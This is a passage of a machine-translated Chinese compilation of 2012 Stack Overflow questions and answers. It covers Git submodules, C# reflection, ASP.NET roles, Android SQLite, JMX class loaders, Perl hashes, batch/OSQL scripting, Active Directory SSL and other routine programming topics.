1.  iPad 应用程序
2.  iPhone 应用程序
3.  共享代码和资源（png 等）

我一直在考虑创建 GIT 存储库，但正在寻找一些建议，以了解设置这些存储库的最佳策略。

对于每个子项目，我可能有多个分支，并且需要对“app”子项目的每个分支使用哪个版本的共享代码进行一些控制。

目前，我合并共享代码的方式是将对该文件的引用复制到“app”项目中。我不确定这是否是最好的前进方式，因为我不确定如果我需要共享代码的多个分支会发生什么。

如果那里有人有类似的设置并可以提供建议，我将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T23:21:10.010

您应该将共享代码声明为**[子模块](http://git-scm.com/book/en/Git-Tools-Submodules)**。

这样，两个应用程序都将引用它们自己对共享代码仓库的提交。
如果您需要在该共享代码仓库中进行任何修改，您可以进入该子目录，制作并提交它们，但您需要返回父仓库（其中一个应用程序）并提交。
请参阅“[子模块的真实性质](https://stackoverflow.com/questions/1979167/git-submodule-update/1979194#1979194)”。

# c# - 获取 MethodInfo 签名

> ID：10658563
> 
> 赞同：0
> 
> 时间：2012-05-18T19:20:31.517
> 
> 标签：c#, string, reflection, signature, methodinfo

假设您有一个与方法 myMethod 相关的 MethodInfo：

```
void myMethod(int param1, int param2) { } 
```

并且您想创建一个表示方法签名的字符串：

```
string myString = "myMethod (int, int)"; 
```

通过 MethodInfo 参数循环，我能够通过调用参数类型的 ToString 方法来实现这些结果：

```
"myMethod (System.Int32, System.Int32)" 
```

我怎样才能改进这一点并产生上面显示的结果？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:28:32.603

据我所知，没有任何内置功能可以将原始类型的*真实*类型名称 ( `System.Int32`) 转换为内置别名 ( `int`)。由于这些别名的数量很少，因此编写自己的方法并不难：

```
public static string GetTypeName(Type type) 
{
    if (type == typeof(int))  // Or "type == typeof(System.Int32)" -- same either way
        return "int";
    else if (type == typeof(long))
        return "long";
    ...
    else
        return type.Name;     // Or "type.FullName" -- not sure if you want the namespace
} 
```

话虽如此，如果用户*确实*输入`System.Int32`而不是`int`（这当然是完全合法的）这种技术仍然会打印出“int”。您对此无能为力，因为`System.Type`无论哪种方式都是相同的——因此您无法找出用户实际键入的变体。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-19T05:41:53.150

这个问题以前有人问过，可以通过 CodeDom api 完成。看到[这个](https://stackoverflow.com/a/6263536/517852)和[这个](https://stackoverflow.com/a/2459614/517852)。请注意，这些关键字（int、bool 等）是特定于语言的，因此如果您为一般的 .NET 使用者输出这些关键字，通常首选框架类型名称。

# c# - 关于使用类名创建类的编程建议

> ID：10658564
> 
> 赞同：1
> 
> 时间：2012-05-18T19:20:32.063
> 
> 标签：c#, createinstance

好的，我已经搜索并看到了一些关于如何使用其名称创建类的问题。我的问题不太一样，所以我还是要问。

我的应用程序有 2 个类，例如“A”和“B”。在另一个类中，我需要使用这两个类（第三个类由外部服务调用）。外部服务仅将两个“A”和“B”类的名称作为字符串传递给我。在第三节课上，我知道我可以做类似的事情：

```
case "A":
    create an instance of A
case "B":
    create an instance of B 
```

但这似乎很奇怪。我想动态地做，所以我在考虑做 Activator.CreateInstance 但不确定它是否是好的编程，因为远程加载程序集时似乎使用了“CreateInstance”。就我而言，一切都在一个项目中。

有什么建议吗？太感谢了！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:39:35.250

如果您想按名称创建的类数量有限（例如您的示例中的 2 个不同的类），我更喜欢使用“switch”的方式

```
public object ClassFactory(string ClassName)
{
    switch(ClassName)
    {
        case "A": return new A();
        case "B": return new B();
    }
} 
```

因为它更快更安全（如果类名来自外部服务，想象一下如果这个服务发送恶意类名会发生什么）。

否则 Activator.CreateInstance 应该不会有任何问题，但请确保彻底验证输入。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:51:38.350

这是使用工厂方法模式的完美案例。

[http://www.dofactory.com/Patterns/PatternFactory.aspx](http://www.dofactory.com/Patterns/PatternFactory.aspx)

# c# - 如何从 asp.net FormsAuthentication 对象获取与用户关联的角色？

> ID：10658569
> 
> 赞同：1
> 
> 时间：2012-05-18T19:21:02.390
> 
> 标签：c#, asp.net, forms-authentication, roles

如何从 asp.net FormsAuthentication 对象获取与用户关联的角色？除了 IsInRole 之外，我看不到任何在这方面有用的方法。我正在寻找像 GetRoles() 这样的东西。我使用的只是 User.IsInRole("rolename") ，我需要遍历我的角色以找到我的 iterest 角色。有没有办法从 Formsauthticket 本身获取角色？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-09T17:57:43.420

实际上，获取用户角色的代码可以是这样的：

```
Roles.GetRolesForUser(WebSecurity.CurrentUserName); 
```

我正在为您提供`WebSecurity.CurrentUserName`获取当前用户的用户名的方法。

您可以尝试使用其他类似的东西：

```
Roles.GetRolesForUser("afzaal_ahmad_zeeshan") 
```

其中**afzaal_ahmad_zeeshan**是您要为其获取角色的用户的用户名。

另请注意，这为您提供了一个`String[]`数组，因此使用`foreach ()`循环可能是过滤掉结果的解决方案。

更多信息：http: [//msdn.microsoft.com/en-us/library/8h930x07.aspx](http://msdn.microsoft.com/en-us/library/8h930x07.aspx)

# django - Django 管理菜单标签

> ID：10658579
> 
> 赞同：0
> 
> 时间：2012-05-18T19:22:09.147
> 
> 标签：django, django-cms

有没有办法在管理菜单中更改应用程序标签？我只是找不到方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T21:15:54.383

检查[django-app-name-translation-in-admin](https://github.com/bmihelac/django-app-name-translation-in-admin/tree/next)。它覆盖了一些 django 管理模板以允许翻译应用程序名称。虽然不是完美的方式，但它可能会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T23:13:53.330

`app_label`您可以使用类中的属性更改特定模型的应用程序标签`Meta`：

```
class TestModel(models.Model):
    ... fields ...

    class Meta:
        app_label = "Your App Label Goes Here" 
```

这仅适用于此特定模型，因此如果您想更改应用程序中所有模型的应用程序标签，则必须为每个模型添加此标签。

# android - SQLiteException：Android 2.1 中的“''”附近

> ID：10658583
> 
> 赞同：0
> 
> 时间：2012-05-18T19:22:52.563
> 
> 标签：android, sqlite, android-sdk-2.1

在 Android 2.1 设备上测试时，我在我的应用程序上遇到了和 FC。当我想将 PRODUCER_ID 与空字符串匹配时，会在此查询中发生这种情况。

```
managedQuery(CONTENT_URI, new String[]{Constants.NAME,
Constants.PRODUCER_ID}, Constants.PRODUCER_ID + " IS NULL OR " +
Constants.PRODUCER_ID + " IS ''", null, null); 
```

例外：

```
android.database.sqlite.SQLiteException: near "''": syntax error: ,
while compiling: SELECT name, producer_id FROM beverages WHERE
producer_id IS NULL OR producer_id IS '' 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:30:18.650

用“=”或“喜欢”代替“IS”。

“is null”或“is in (...)”、“is between”、“is not null”等都是有效的。“是''”不是。

# java - 无法使 MXBean 通过 JConsole 连接到数据库

> ID：10658584
> 
> 赞同：3
> 
> 时间：2012-05-18T19:22:55.683
> 
> 标签：java, spring, tomcat, jmx, jconsole

我只是希望是否有人已经看到并解决了这个问题。我有一个 MBean 和一个 MXBean 类。两者都使用相同的服务类通过 DAO 类访问数据库。我正在使用 spring 3.0 来初始化这些类并使用 JConsole 来测试这些 bean。这两个 bean 具有相同的方法名称来访问它们的服务类，比如说 methodA()。但是连接oracle数据库时，只有MBean类返回数据。另一个 MXBean 类会产生一些错误。

这是错误

```
 EL Severe]: 2012-05-18 10:37:54.134--ServerSession(1992289)--Thread(Thread[RMI TCP Connection(6)-10.208.138.241,5,RMI Runtime])--java.lang.IllegalArgumentException: interface oracle.ucp.jdbc.LabelableConnection is not visible from class loader
    at java.lang.reflect.Proxy.getProxyClass(Proxy.java:353)
    at java.lang.reflect.Proxy.newProxyInstance(Proxy.java:581)
    at oracle.ucp.jdbc.proxy.ConnectionProxyFactory.createConnectionProxy(ConnectionProxyFactory.java:78)
    at oracle.ucp.jdbc.PoolDataSourceImpl.getConnection(PoolDataSourceImpl.java:658)
    at oracle.ucp.jdbc.PoolDataSourceImpl.getConnection(PoolDataSourceImpl.java:613)
    at oracle.ucp.jdbc.PoolDataSourceImpl.getConnection(PoolDataSourceImpl.java:607)
    at org.springframework.jdbc.datasource.DelegatingDataSource.getConnection(DelegatingDataSource.java:83)
    at com.trgr.cobalt.dataorch.datasource.BaseDODataSource.getRawConnection(BaseDODataSource.java:76)
    at com.trgr.cobalt.dataorch.datasource.BaseDODataSource.getConnection(BaseDODataSource.java:46)
    at com.trgr.cobalt.dataorch.datasource.BaseDODataSource.getConnection(BaseDODataSource.java:35)
    at org.eclipse.persistence.sessions.JNDIConnector.connect(JNDIConnector.java:126)
    at org.eclipse.persistence.sessions.JNDIConnector.connect(JNDIConnector.java:94)
    at org.eclipse.persistence.sessions.DatasourceLogin.connectToDatasource(DatasourceLogin.java:162)
    at org.eclipse.persistence.internal.databaseaccess.DatasourceAccessor.connectInternal(DatasourceAccessor.java:327)
    at org.eclipse.persistence.internal.databaseaccess.DatabaseAccessor.connectInternal(DatabaseAccessor.java:291)
    at org.eclipse.persistence.internal.databaseaccess.DatasourceAccessor.connect(DatasourceAccessor.java:415)
    at org.eclipse.persistence.sessions.server.ConnectionPool.buildConnection(ConnectionPool.java:155)
    at org.eclipse.persistence.sessions.server.ExternalConnectionPool.startUp(ExternalConnectionPool.java:118)
    at org.eclipse.persistence.sessions.server.ServerSession.connect(ServerSession.java:495)
    at org.eclipse.persistence.internal.sessions.DatabaseSessionImpl.login(DatabaseSessionImpl.java:627)
    at org.eclipse.persistence.internal.jpa.EntityManagerFactoryProvider.login(EntityManagerFactoryProvider.java:230)
    at org.eclipse.persistence.internal.jpa.EntityManagerSetupImpl.deploy(EntityManagerSetupImpl.java:389)
    at org.eclipse.persistence.internal.jpa.EntityManagerFactoryImpl.getServerSession(EntityManagerFactoryImpl.java:164) 
```

这是我的弹簧配置

```
<bean id="exporter" class="org.springframework.jmx.export.MBeanExporter"
    lazy-init="false">
    <property name="namingStrategy" ref="namingStrategy"></property>
    <property name="assembler" ref="assembler"></property>
    <property name="autodetect" value="true" />
</bean>

<bean id="attributeSource"
    class="org.springframework.jmx.export.annotation.AnnotationJmxAttributeSource" />
<bean id="assembler"
    class="org.springframework.jmx.export.assembler.MetadataMBeanInfoAssembler">
    <property name="attributeSource" ref="attributeSource" />
</bean>
<bean id="namingStrategy"
    class="org.springframework.jmx.export.naming.MetadataNamingStrategy">
    <property name="attributeSource" ref="attributeSource" />
</bean>

<bean class="myclass.jmx.DocumentMBean"
    p:schedulerService-ref="documentService" />

<bean class="myclass.jmx.DocumentMXBean"
    p:schedulerService-ref="documentService" /> 
```

DocumentMBean 是一个常规的 MBean。DocumentMXBean 是一个 MXBean。这两个 bean 使用相同的 documentService 服务类，它使用相同的 DAO 类从 Oracle 数据库中获取数据。DocumentMBean 正确返回数据。DocumentMXBean 有上面提到的错误。

有谁知道为什么类加载器看不到 oracle.ucp.jdbc.LabelableConnection 类？仅当我执行 MXBean 时才会发生这种情况。我的 MBean 正确返回数据。我的 WEB-INF/lib 文件夹中有包含该类的 jar 文件。这部署在Tomcat中。我从 Eclipse 中启动 Tomcat。

**更新1：**

我能够通过将那些“不可见”类的 jar 文件添加到 Eclipse 中的 Tomcat 类路径来临时解决这个问题。似乎为了加载 MBean，JConsole/java 正在使用我的 Web 应用程序类加载器，它可以访问类加载器所需的所有库。但是在加载 MXBeans 时，JConsole/java 使用 Tomcat 的类加载器。

我的问题是：在加载 MBean 或 MXBean 时，有没有办法强制 Tomcat/Eclipse/Java 使用相同的类加载器（这是我的 Web 应用程序类加载器）？

**更新 2：**

我发现在加载我的 Web 应用程序时，Spring 使用 Web 应用程序的类加载器，而 Tomcat 在加载任何 MXBean 时，它使用 JVM 类加载器，其中没有我的 oracle 类路径。因此，变通的解决方案是使用我的类的类加载器，而不是来自 JVM 的类加载器。代码应该是：

```
 try
    {
    // your codes here

    // Get the current class-loader. This might be the class-loader from Tomcat
    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();

    // Set the class-loader to be the one from the DO and not the one from Tomcat
    Thread.currentThread().setContextClassLoader(getClass().getClassLoader());

    // your codes here
    }
    catch (Exception e)
    {
       // your codes here
    }
    finally
    {
       // Remember to set back the original class-loader
       Thread.currentThread().setContextClassLoader(contextClassLoader);
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T20:10:14.637

MXBean 可能是由容器类加载器加载的，而不是由 Web 应用程序加载的。如果驱动程序位于应用程序库目录中，那么这将导致您看到的问题。

如果是这种情况，请将驱动程序移至 tomcat/lib 目录。

# android - 这段代码是否有任何错误，它显示带有字母预览的快速滚动列表

> ID：10658591
> 
> 赞同：1
> 
> 时间：2012-05-18T19:23:41.347
> 
> 标签：android, listview

我在 Android listview 中显示第一个字母的预览时遇到问题，当我快速滚动时，我得到了文本的预览，但它会指向列表中的错误位置。

例如，请看下图，现在我们在 M 部分，仍然出现 L 字母。

![在此处输入图像描述](../Images/5d86055ce53ea3d08fc670e88fe9fd59.png)

这是实现上述技术的Listadapter代码，代码有什么错误吗？

```
 class MyListAdaptor extends ArrayAdapter<String> implements
        SectionIndexer 
{

    HashMap<String, Integer> alphaIndexer;
    String[] sections;

    public MyListAdaptor(Context context, LinkedList<String> items) {
        super(context, R.layout.list_item, items);

        alphaIndexer = new HashMap<String, Integer>();
        int size = items.size();

        for (int x = 0; x < size; x++) {
            String s = items.get(x);

            // get the first letter of the store
            String ch = s.substring(0, 1);
            // convert to uppercase otherwise lowercase a -z will be sorted
            // after upper A-Z
            ch = ch.toUpperCase();

            // HashMap will prevent duplicates
            alphaIndexer.put(ch, x);
        }

        Set<String> sectionLetters = alphaIndexer.keySet();

        // create a list from the set to sort
        ArrayList<String> sectionList = new ArrayList<String>(
                sectionLetters);

        Collections.sort(sectionList);

        sections = new String[sectionList.size()];

        sectionList.toArray(sections);
    }

    public int getPositionForSection(int section) {
        return alphaIndexer.get(sections[section]);
    }

    public int getSectionForPosition(int position) {
        return 0;
    }

    public Object[] getSections() {
        return sections;
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:29:12.637

通过使用`alphaIndexer.put(ch, x);`来防止重复，您可以保留以开头的元素`ch`而不是第一个元素的最后一个位置。这是因为`put`除了第一个给定键的调用之外，每次调用都会更新旧值。尝试使用此代码，您将更近一步：

```
if( !alphaIndexer.containsKey(ch) )
    alphaIndexer.put(ch, x); 
```

# css - Ipad 视口尺寸

> ID：10658592
> 
> 赞同：0
> 
> 时间：2012-05-18T19:23:42.793
> 
> 标签：css, ipad, ios-simulator

以像素为单位，iPad 在纵向和横向模式下的尺寸是多少（当地址栏可见时）？

我在互联网上浏览了一下，令人惊讶的是，找不到答案。大多数资源列出了设备尺寸而不是视口尺寸。

如果我使用 iOS 模拟器，请截屏并在 Photoshop 中打开它，纵向模式下的高度为 930 像素。但是，如果我创建一个页面并在模拟器中查看它，我可以使页面在被截断之前高达 1163 像素，这看起来不正确！

如果有人能提供尺寸，我将不胜感激。

# perl - Perl Hash Keys + Values to variable

> ID：10658594
> 
> 赞同：0
> 
> 时间：2012-05-18T19:23:43.893
> 
> 标签：perl, hash

所以我有一个这样的哈希表：

```
M => 1
S => 50 
```

我想做这样的事情：

```
$var = map { "$hash{$_}"."$_\n" } keys %hash;
print $var; 
```

这样我最终得到了一个要打印的变量，如下所示：

```
1M50S 
```

不幸的是， map 语句不起作用:( 是的，它必须分配给一个变量，因为它在 if 语句中并根据条件而变化。有没有一种干净的方法来做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:37:40.480

只需使用反向：

```
my %hash = (M => 1, S => 50);
my $var = reverse %hash;
## use the next line instead if you need sorting
#my $var = join '', map { $_ . $hash{ $_ } } reverse sort keys %hash;
## or this
#my $var = reverse map { $_ => $hash{ $_ } } reverse sort keys %hash;
print $var; ## outputs 1M50S 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:29:18.067

例如，您可以先连接值 + 键，然后进行连接：

```
%hash = (M => 1, S => 50);
$var = join("", map {$hash{$_} . $_}  keys %hash);
print $var . "\n" ; 
```

补充：如果你想按值排序，假设它们是数字：

```
%hash = (M => 1, S => 50, Z => 6);
$var = join("", map {$hash{$_} . $_}  sort { $hash{$a} <=> $hash{$b} } keys %hash);
print $var . "\n" ;

1M6Z50S 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T19:31:51.653

你必须知道它`keys %hash`是无序的，这意味着它的顺序可能是也可能不是你想要的。

我建议在此处使用有序列表来指定键。

还有一条不洁的路

```
%time=(M=>1,S=>50);
$var=join"",map{"$time{$_}$_"}('M','S');
#=> $var='1M50S' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-18T20:36:05.973

如果`MIDNSHP=X`所有键都按您想要的顺序排列，那么写

```
my $var = join '', map "$hash{$_}$_", split //, 'MIDNSHP=X'; 
```

如果哈希可能包含少于一组完整的键，则使用它来代替

```
my $var = join '', map "$hash{$_}$_", grep $hash{$_}, split //, 'MIDNSHP=X'; 
```

# javascript - ckeditor - 如何管理配置更改

> ID：10658597
> 
> 赞同：0
> 
> 时间：2012-05-18T19:24:28.910
> 
> 标签：javascript, ckeditor

我有一个 ckeditor 插件，它依赖于一些自定义参数。这些参数可能会在操作过程中改变值。我最终实现这一点的方式是将当前值保存在插件内的局部变量中，该变量在开始时初始化并且可以通过自定义命令进行更改。像这样

```
var somethingId = editor.config.myplugin_Something;
editor.addCommand('changeSomething',  {
    exec: function(_editor, data) {
        somethingId = data.something;
    }
}); 
```

这工作正常，但我有一个问题（据我所知）我到达需要更改数据的位置，但编辑器尚未初始化，所以调用

```
$.each(CKEDITOR.instances, function (index, editor) {
    editor.execCommand('changeSomething', {
        something: newValue
        });
}); 
```

没有效果，插件以初始配置中传递的值结束。

我想不出使用全局变量的好方法。有没有更好的方法来管理 ckeditor 插件的可变配置参数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T18:33:12.313

我想出了一个足够简单的解决方案。使用`config`对象本身，并确保初始化*回调*也设置了正确的值。

所以初始化看起来更像：

```
var config = { width: xxx, height: xxx}; // do not include "something" value
$('#mytextbox').ckeditor(function(){
    this.config.myplugin_somethingId = currentSomethingValue;
}); 
```

当它需要稍后修改时，我会这样做，

```
$.each(CKEDITOR.instances, function (index, editor) {
     editor.config.myplugin_somethingId = newSomethingValue;
}); 
```

# c - 使用 openCV 在 C 中对 3d 函数 [视频] 进行 1d DFT

> ID：10658603
> 
> 赞同：0
> 
> 时间：2012-05-18T19:25:06.307
> 
> 标签：c, video, opencv, dft

我正在尝试在 C 编程中沿着 GOP（图片组 - 基本上是视频）计算 1d DFT。我需要沿时间方向应用 1d DFT 将 gop 转换为时间域。在该域中，空间信息和时间频率信息存在于同一帧中。

因此，大小为 (M , N , T) 的视频 f(x, y, t) 的一维 DFT，其中 M x N 是每帧的大小，T 是 GOP 中的总帧数，计算公式为以下等式：

[公式方程](http://i46.tinypic.com/fkyzo2.jpg)

有谁知道我如何使用 openCV 或类似的东西来处理这个问题？

如果您需要任何其他信息，请告诉我！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:52:54.083

如果我正确理解你的问题，你想计算关于时间坐标的傅里叶变换。

为此，我认为您需要将 3D 立方体重塑为 2D 矩阵，其中垂直坐标是像素索引（在 [0, MN-1] 范围内），水平坐标是时间（范围 [0 , T-1])，即每一行包含序列中一个像素的值。`cv::dft()`然后，您可以使用函数和标志沿每一行应用 DFT 例程`CV_DFT_ROWS`。

**矩阵创建**

要创建矩阵，您将按照以下步骤进行（假设视频帧有 M 行和 N 列）：

1.  分配`cv::Mat`具有**NM**行和**T**列的 a，其中 T 是您的时间窗口的宽度（它可以是几帧或 while 序列长度）。我们称这个矩阵为**W**（代表窗口）。

2.  对于窗口中的每一帧 I(.,.,t)，将每个像素 I(x,y,t)（x 范围为 [0,N-1]，y 范围为 ]0,M-1]）复制到W 中的对应位置，即**W(y*M+x, t)**。

在此过程结束时，W 将在每一行中包含一个像素的随时间变化的值。然后，调用`cv::dft`带有标志的 W 以`CV_DFT_ROWS`将 2D 傅里叶变换限制在水平方向，这就是时间。

# php - PHP 文档在表单发布时过期

> ID：10658606
> 
> 赞同：0
> 
> 时间：2012-05-18T19:25:23.870
> 
> 标签：php, html, post

我的第 1 页带有表单（POST），该表单发布到第 2 页，如果表单 POSTed 显示结果，如果表单未发布并且第 2 页打开，它将显示基于 PHP 的其他内容`if`。第 2 页有到第 3 页的链接，当我从第 1 页 -> 第 2 页发布表单并通过链接转到第 3 页时，我单击返回并获得“文档已过期”

有人告诉我这是正常的，但是为什么会发生这种情况？我假设如果 PHP 检查的 POST 变量不存在并为页面提供不同的内容，它应该有多好。

有什么方法可以让它工作或将其编码到浏览器中以使其表现得像这样吗？

编辑答案：`<?php session_cache_limiter('private_no_expire'); ... ?>`已修复

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:24:40.150

在您的表单处理脚本（我认为是第 2 页）中，您应该在处理完数据后重定向。这样用户就永远不会看到该错误。

例子：

```
if (isset($_POST['submit'])) {
    // save something to database
    header('Location: http://www.example.com/page2');
    exit;
}

// other content 
```

# sql - 批量OSQL命令，如何将多个块插入记录

> ID：10658609
> 
> 赞同：0
> 
> 时间：2012-05-18T19:25:38.353
> 
> 标签：sql, batch-file, osql

我使用 OSQL (SQL Server 2000) 并有一个批处理文件，它将 html 源分块为 8xxx 字节的数据。我怎样才能将块恢复到 sql 记录中？以下是详细信息：

osql 语句的批处理文件：

```
 echo use database;>tempsql.sql
    echo set indentity_insert tablename ON;>>tempsql.sql
    echo insert into tablename (ID, Name, Date, Body_HTML)>>tempsql.sql
    echo values ('%id%', '%name%', '%cdate%', '%body_html%');>>tempsql.sql
    echo set indentity_insert tablename OFF;>>tempsql.sql
    echo go>>tempsql.sql
    osql -U user -P pass -d database < tempsql.sql -o sqloutput.rpt 
```

所有变量 BUT %Body_Html% 都适合 8k 堆栈，但 %body_html% 的数据大于 8k（最多 50k），因此必须将其“分块”以适合堆栈。下面只是块例程的一部分，供您查看（非常感谢 jeb 和 dbenham）：

```
 @echo off
    set count=0
    setlocal EnableDelayedExpansion EnableExtensions
    for /f "tokens=*" %%a in ("newhtml.htm") do set FileSize=%%~za
    echo FileSize is %FileSize% bytes
    if %FileSize% GTR 8159 goto split
    rem skip regular insert routine, pick up at :split
    :split
        set count=0
set /a all_sub=%FileSize% / 8159
set /a all_rem=%FileSize% %% 8159
if %all_rem% NEQ 0 set /a all_ttl=%all_sub% + 1
echo %all_sub% full page(s), %all_rem% bytes(s) leftover, %all_ttl% total pages
chunk newhtml.htm basenam -s8159 -o
set count=0
     :: now get accurate file count of basenam.*
for /f "tokens=1*" %%a in ('dir basenam.* ^| find "File"') do (
    set setfiles=%%a
)
echo  %setfiles%>setfiles
set count=0
     ::now show where the break is
     echo Loop %count%
SETLOCAL DisableDelayedExpansion 
set "all="
FOR /F "usebackq delims=" %%a in (`"findstr /n ^^ basenam.00%count%"`) do (
    set "line=%%a"
    SETLOCAL EnableDelayedExpansion
    set "line=!line:#=#S!"
    set "line=!line:*:=!"
    for /F "delims=" %%p in ("!all!#L!line!") do (
        ENDLOCAL
        set "all=%%p"
    )
)
SETLOCAL EnableDelayedExpansion
if defined all (
set "all=!all:~2!"
set ^"all=!all:#L=^

!"
set "all=!all:#S=#!")
:: now display file in 8159 byte chunks, does emit a blank line in between
echo !all!
set /a count=!count! + 1
for /f "tokens=*" %%m in (setfiles) do set setfiles=%%m
if %count% EQU !setfiles! goto end
goto loop1
:end 
```

那么如何将我的块例程与我的 osql 例程合并？我知道我可能不得不嵌套一些 FOR 循环，但我想不出基于上述参数的方法。

和块，可以在这里找到：[http ://www.oldskool.org/pc/chunk](http://www.oldskool.org/pc/chunk)

**编辑：**所以看起来我可能需要在 osql 循环中以不同的方式思考逻辑，我怎么能 1）读取多个变量或 2）读取文件，作为变量 %body_html% 到 oqsl 结果文件（sqloutput. rpt)

我应该像这样分解回声语句：

```
 echo use database;>tempsql.sql
    echo set indentity_insert tablename ON;>>tempsql.sql
    echo insert into tablename (ID, Name, Date, Body_HTML)>>tempsql.sql
    echo values ('%id%', '%name%', '%cdate%', '>>tempsql.sql
    rem  %body_html%
    rem put chunk routine here
    rem echo !All!>>tempsql.sql
    echo ';>>tempsql.sql
    echo set indentity_insert tablename OFF;>>tempsql.sql
    echo go>>tempsql.sql 
```

现在我认为这可能会奏效，尽管它并不漂亮。稍后会发布我的结果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T21:53:12.930

所以这个 inded（逻辑）在生成 sql 文件时起作用，并将整个 html 插入到 tempsql 文件中。如果有人有兴趣，我会发布代码。

# plone - 运行粘贴后，我的产品中有几个鸡蛋

> ID：10658613
> 
> 赞同：3
> 
> 时间：2012-05-18T19:25:52.327
> 
> 标签：plone, egg, paster

我刚跑

`bin/paster create -t dexterity my.example`

运行后，我有以下内容：

```
 bootstrap.py
 docs
 my.example.egg-info
 PasteDeploy-1.5.0-py2.6.egg
 plone.cfg
 setup.cfg
 buildout.cfg
 my
 Paste-1.7.5.1-py2.6.egg
 PasteScript-1.7.5-py2.6.egg
 README.txt
 setup.py 
```

为什么我还有3个鸡蛋？我的构建配置错误吗？

我刚刚使用统一安装程序安装了 Plone4，当我尝试运行 pater 命令时出现此错误：

```
 AttributeError: 'module' object has no attribute 'NoDefault' 
```

那时我将部分附加到我的构建中，如此[处](http://collective-docs.readthedocs.org/en/latest/tutorials/paste.html)`[paster]`所示。最初，我的扩建只有部分没有部分。`[zopskel]``[paster]`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T20:26:47.903

这是完全正常的，如果有点恼人的话。您的 setup.py 文件将这些内容与`setup_requires`and`paster_plugins`部分一起引入：

```
setup(...
    setup_requires=["PasteScript"],
    paster_plugins=["ZopeSkel"],
    ...
) 
```

ZopeSkel 粘贴食谱使用这些鸡蛋让您在以后将片段添加到生成的鸡蛋中。如果您不需要此功能，请删除上述两个条目和鸡蛋。

# active-directory - 使用安全全局目录的 Active Directory 失败

> ID：10658616
> 
> 赞同：0
> 
> 时间：2012-05-18T19:26:15.513
> 
> 标签：active-directory

首先让我说我对 Active Directory 相当陌生，而且我不是处理服务器配置的人（如果这确实是与服务器相关的问题）。但是，如果给出适当的建议，我可以将所说的建议传达给正确的人。

我们正在运行一个大型 ASP.NET C# .NET 3.5 应用程序。

这是我们遇到的场景：

我创建了一个测试页面来测试我们的全局目录 AD 搜索。

从测试服务器 1 发生的情况如下：

使用 GC://TEST.COM:3268（不安全）-> 出色的性能。

使用 G:C//TEST.COM:3269（安全）-> 出色的性能

从测试服务器 2：

使用 GC://TEST.COM:3268（不安全）-> 出色的性能。

使用 G:C//TEST.COM:3269（安全）-> 失败。

我看到的唯一异常是：异常：“服务器无法运行”

我认为这不是代码问题，因为两个测试服务器都运行相同的代码。只有当我们尝试从测试服务器 2 连接到 GC 的安全端口时，我们才会遇到问题。

这是我尝试在服务器上运行它时的异常信息，我让它将异常转储到日志表中：

目录服务 Com 异常（异常消息）：服务器无法运行。错误代码：-2147016646 堆栈跟踪：

在 System.DirectoryServices.DirectoryEntry.Bind（布尔 throwIfFail）

在 System.DirectoryServices.DirectoryEntry.Bind() 在 System.DirectoryServices.DirectoryEntry.get_AdsObject()

在 System.DirectoryServices.DirectorySearcher.FindAll（布尔 findMoreThanOne）

在 System.DirectoryServices.DirectorySearcher.FindOne() 在 TestClass.GetUserDomainTest(String UserName) 中

testclass.aspx.cs：第 155 行

就像我说的那样，我不认为这是代码问题，但如果可能有帮助，我已经附上了代码：

```
private string GetUserDomain2(string UserName) 
{ 
    string domainName = String.Empty; 
    try 
    { 
       // This is Test page code so we can change the values as we want 
        DirectoryEntry entry = new DirectoryEntry(txtGCPath.Text) 
        entry.Username = txtGCUserID.Text; 
        entry.Password = txtGCPassword.Text; 
        // Set SSL or leave default 
        if (cb1.Checked == true) 
        { 
            entry.AuthenticationType = AuthenticationTypes.SecureSocketsLayer; 
        } 

        DirectorySearcher search = new DirectorySearcher(); 
        search.SearchRoot = entry; 
        search.SearchScope = SearchScope.Subtree; 
        search.Filter = string.Format(txtGCFilter.Text, UserName); 

        SearchResult results = search.FindOne(); // CRASHES HERE 
      // Parsing code removed. 
      return domainName; 
   } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T14:45:15.783

您不需要 SSL，并且默认情况下未启用 SSL。您可以使用 Kerberos 安全功能对流量进行完全加密。这就是我对 SASL' QOP 所做的`auth-conf`。

# parsing - 使用“幻数”SFS 读取 1998 年文件的搜索工具/指南

> ID：10658618
> 
> 赞同：5
> 
> 时间：2012-05-18T19:26:31.287
> 
> 标签：parsing, file-type

我有一个以幻数“SFS”开头的文件。该文件创建于 1998 年。您有什么想法可以帮我解析它吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-21T11:59:18.550

读取文件的 35 到 70 字节`Copyright (c) 1996 Auric Vision Ltd`。快速的谷歌显示 Auric Vision Ltd（与 Zes't Studio 一起）是一款名为[ГЭГ: Отвязное приключение](http://www.mobygames.com/game/gag-otvjaznoe-prikluchenie)（或*Gag：*荷兰语中的 Het Impotentie-Mysterie）的成人冒险游戏的开发商，其中一个组件是俄罗斯方块克隆. 您的文件是该组件的[此下载中的两个文件之一。](http://www.download-central.ws/Win32/Tetris/XTET/)

如果您仍希望“解析”该文件，则需要对可执行文件进行逆向工程（这可能违反 Auric Vision 的许可条件）。

